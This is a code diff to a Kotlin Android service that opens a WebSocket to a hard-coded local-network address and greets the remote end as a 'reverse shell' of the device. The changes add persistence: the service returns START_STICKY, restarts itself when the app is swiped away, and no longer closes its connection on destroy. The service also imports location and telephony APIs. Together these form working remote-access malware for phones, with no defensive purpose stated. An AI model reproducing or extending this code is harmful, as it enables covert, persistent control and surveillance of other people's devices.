@@ -15,6 +15,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.IBinder
 import android.telephony.TelephonyManager
+import android.widget.Toast
 import androidx.annotation.RequiresApi
 import androidx.core.content.ContextCompat
 import com.google.android.gms.location.FusedLocationProviderClient
@@ -42,11 +43,32 @@ class WebSocketService : Service() {
     override fun onCreate() {
         super.onCreate()
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+
+        createNotificationChannel()
+        val notification: Notification = Notification.Builder(this, CHANNEL_ID)
+            .setContentTitle("WebSocket Service")
+            .setContentText("WebSocket Service is running")
+            .setSmallIcon(R.drawable.ic_launcher_foreground)
+            .build()
+
         // Khởi tạo WebSocket
         client = OkHttpClient()
         val request = Request.Builder().url("ws://192.168.0.199:5525").build()
         val listener = EchoWebSocketListener()
         webSocket = client.newWebSocket(request, listener)
+
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        Toast.makeText(this, "WebSocket Service started", Toast.LENGTH_SHORT).show()
+        return START_STICKY
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        val restartServiceIntent = Intent(applicationContext, this.javaClass)
+        restartServiceIntent.setPackage(packageName)
+        startService(restartServiceIntent)
+        super.onTaskRemoved(rootIntent)
     }
 
 
@@ -57,6 +79,7 @@ class WebSocketService : Service() {
                 "Hello there, welcome to reverse shell of ${Build.MODEL} \n" + help
             webSocket.send(message)
         }
+
 
         @SuppressLint("Range")
         @RequiresApi(Build.VERSION_CODES.M)
@@ -258,10 +281,10 @@ class WebSocketService : Service() {
         return null
     }
 
-    override fun onDestroy() {
-        super.onDestroy()
-        webSocket.close(1000, null)
-    }
+//    override fun onDestroy() {
+//        super.onDestroy()
+//        webSocket.close(1000, null)
+//    }
 
     companion object {
         const val CHANNEL_ID = "WebSocketServiceChannel"
